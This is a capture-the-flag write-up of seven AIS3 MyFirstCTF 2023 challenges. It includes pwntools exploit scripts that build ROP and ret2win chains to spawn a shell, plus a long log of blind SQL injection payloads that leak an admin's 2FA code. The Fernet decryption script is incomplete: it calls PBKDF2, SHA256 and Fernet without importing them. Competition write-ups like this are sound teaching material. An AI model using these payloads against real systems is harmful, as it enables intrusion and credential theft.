# 2023 MyFirstCTF Writeup

Here are 7 challenges I solved in MyFirstCTF and I got the **first place**! (And that's the final result of pre-exam.)

## Welcome

Just open PDF and use your eyes. (?)

`AIS3{WELCOME-TO-2023-PRE-EXAM-&-MY-FIRST-CTF}`

## Robot

If you use eval, you'll stuck since once you're too fast, it'll give you `{*iter(int,1)}` to stuck you.

So disgusting. Actually I get the flag by hand.

`AIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}`

## Simply Pwn

A binary with statically linked libc. With a trivial buffer overflow.

My solution is ret2libc, but I cannot find system function. So I use `execve("/bin/sh", 0, 0)` instead. Just control the registers with gadgets found by `ROPGadget` and call `execve` to get the shell.

Here is the exploit script:

```python
# Offset is 79
# Statically linked binary
# I didn't find system so I use execve
'''
$ ROPgadget --binary pwn --string '/bin/sh'      
Strings information
============================================================
0x0000000000498004 : /bin/sh

$ ROPgadget --binary pwn --only 'pop|ret' | grep rdi
0x00000000004049d4 : pop rdi ; pop rbp ; ret
0x0000000000401f2f : pop rdi ; ret

$ ROPgadget --binary pwn --only 'pop|ret' | grep rsi
0x00000000004049d2 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000401f2d : pop rsi ; pop r15 ; ret
0x0000000000409f5e : pop rsi ; ret
                                                                                                                                                    
$ ROPgadget --binary pwn --only 'pop|ret' | grep rdx
0x000000000047f03a : pop rax ; pop rdx ; pop rbx ; ret
0x000000000047f03b : pop rdx ; pop rbx ; ret
'''

bin_sh = 0x0000000000498004
pop_rdi_ret = 0x0000000000401f2f
pop_rsi_ret = 0x0000000000409f5e
execve = 0x0000000000472b00
pop_rdx_rbx_ret = 0x000000000047f03b
from pwn import *
import sys
context.log_level = "debug"


if len(sys.argv) == 1:
    r = process("./pwn")
    #gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
padding = b'A' * 79
r.recvuntil(b"Show me your name: ")
r.sendline(padding + p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_rbx_ret) + p64(0) + p64(0) +  p64(execve))
r.recvuntil(b'\x0a')
r.interactive()
```

After the contest, I found that there is actually a backdoor function `shellcode`... So we can just use it to get the shell.

```python
# Offset is 79
# Statically linked binary
'''
$ objdump -D pwn -M intel | grep shellcode
00000000004017a5 <shellcode>:
'''
bd = 0x00000000004017a5
from pwn import *
import sys
context.log_level = "debug"


if len(sys.argv) == 1:
    r = process("./pwn")
    #gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
padding = b'A' * 79
r.recvuntil(b"Show me your name: ")
r.sendline(padding + p64(bd))
r.recvuntil(b'\x0a')
r.interactive()
```

Also when I'm writing this writeup, I found that this binary has canary enabled. Why we can bypass it? Because the canary is in those libc functions, not in the main function.

`AIS3{5imP1e_Pwn_4_beGinn3rs!}`

## ManagementSystem

Looks like a heap exploitation challenge. But here is my first CTF so keep it simple.

Just notice that it uses `gets` somewhere in the program and the rest is classic ret2win.

I add a user in advance or we'll crash early I remember.

```python
from pwn import *
import sys
# context.log_level = "debug"

if len(sys.argv) == 1:
    r = process("./ms")
    #gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
bd = 0x000000000040131b
padding = b'A' * 104

r.sendlineafter(b'> ',b'1')
r.sendlineafter(b': ',b'a')
r.sendlineafter(b': ',b'b')
r.sendlineafter(b': ',b'c')
r.sendlineafter(b'> ',b'3')
r.sendlineafter(b': ',padding + p64(bd))

r.interactive()
```

`FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}`

## Simply Reverse

Press F5 in IDA.

```c
_BOOL8 __fastcall verify(__int64 a1)
{
  int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; *(_BYTE *)(i + a1); ++i )
  {
    if ( encrypted[i] != ((unsigned __int8)((i ^ *(unsigned __int8 *)(i + a1)) << ((i ^ 9) & 3)) | (unsigned __int8)((i ^ *(unsigned __int8 *)(i + a1)) >> (8 - ((i ^ 9) & 3))))
                       + 8 )
      return 0LL;
  }
  return i == 34;
}
```

And the encrypted array is:

```text
.data:0000000000004020 encrypted       db 8Ah, 50h, 92h, 0C8h, 6, 3Dh, 5Bh, 95h, 0B6h, 52h, 1Bh
.data:0000000000004020                 db 35h, 82h, 5Ah, 0EAh, 0F8h, 94h, 28h, 72h, 0DDh, 0D4h
.data:0000000000004020                 db 5Dh, 0E3h, 29h, 0BAh, 58h, 52h, 0A8h, 64h, 35h, 81h
.data:0000000000004020                 db 0ACh, 0Ah, 64h, 0
```

We can just bruteforce the answer.

```python
encrypted = [
    0x8A, 0x50, 0x92, 0xC8, 0x06, 0x3D, 0x5B, 0x95,
    0xB6, 0x52, 0x1B, 0x35, 0x82, 0x5A, 0xEA, 0xF8,
    0x94, 0x28, 0x72, 0xDD, 0xD4, 0x5D, 0xE3, 0x29,
    0xBA, 0x58, 0x52, 0xA8, 0x64, 0x35, 0x81, 0xAC,
    0x0A, 0x64, 0x00
]
print(len(encrypted))
cnt = 0
for i in range(len(encrypted)):
    for j in range(128):
        # print(i,j,(((i ^ (j)) << ((i ^ 9) & 3)) | ((i ^ (j)) >> (8 - ((i ^ 9) & 3)))) + 8)
        if (encrypted[i] == (((i ^ (i + j)) << ((i ^ 9) & 3)) | ((i ^ (i + j)) >> (8 - ((i ^ 9) & 3)))) % 256 + 8 ):
            print(chr(i+j),end='')
            cnt += 1
print("\nLen = ",cnt)

'''
$ python3 solve.py
35
AIS30ld_Ch@1_R3V1_fr@m_AIS32016!}
Len =  33
Can guess the flag is AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}
'''
```

`AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}`

## Fernet

The vulnerability is that encrypt function packs the salt as the first 16 bytes of the ciphertext after base 64 decode. So we can just reverse the encrypt process to get the flag.

And the leak password is just `mysecretpassword`. We don't have to bruteforce it.

```python
leak_password = 'mysecretpassword'
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.modes import CBC
from cryptography.hazmat.primitives import padding

def decrypt(ciphertext, password):
    decoded = base64.b64decode(ciphertext)
    salt = decoded[:16]
    ciphertext = decoded[16:]
    key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)  
    f = Fernet(base64.urlsafe_b64encode(key)) 
    plaintext = f.decrypt(ciphertext)  
    return plaintext.decode()
print(decrypt("iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj",leak_password))
```

## Login Panel

Easy solution: After the login, we are at 2FA page, but the check of the dashboard is bad so we can just jump to the dashboard after we sql inject the username and password.

My solution is really complicated: blind sql injection.

We can use `SUBSTR` and binary search to leak the admin 2FA code. Which took me about 40 minutes since there's recaptcha. I'm just too stupid.

`AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}`

My process: (Warning: very lengthy)

```sql
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 1, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 1, 1) < '7' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 1, 1) < '9' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 1, 1) > '8' -- T
9
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 2, 1) < '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 2, 1) > '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 2, 1) > '4' -- F
94
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 3, 1) > '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 3, 1) > '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 3, 1) > '4' -- T
945
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 4, 1) > '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 4, 1) > '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 4, 1) > '8' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 4, 1) < '9' -- F
9459
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 5, 1) > '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 5, 1) > '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 5, 1) > '8' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 5, 1) < '9' -- F
94599
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) > '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) > '3' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) > '1' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) > '2' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 6, 1) < '3' -- F
945993
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 7, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 7, 1) > '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 7, 1) > '8' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 7, 1) < '9' -- F
9459939
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) > '7' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) > '6' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) < '6' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 8, 1) > '5' -- F
94599395
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) < '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) < '3' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) > '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) < '4' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 9, 1) > '4' -- F
945993954
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) < '7' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) > '8' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) < '8' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 10, 1) > '7' -- F
9459939547
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) < '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) < '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) < '1' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) > '1' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 11, 1) < '2' -- T
94599395471
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 12, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 12, 1) < '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 12, 1) > '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 12, 1) < '6' -- T
945993954715
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 13, 1) < '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 13, 1) < '7' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 13, 1) > '5' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 13, 1) < '6' -- T
9459939547155
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) < '5' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) < '3' -- T
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) < '1' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) > '1' -- F
' OR SUBSTRING((SELECT code FROM Users WHERE username = 'admin'), 14, 1) < '2' -- T
94599395471551
AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}
```
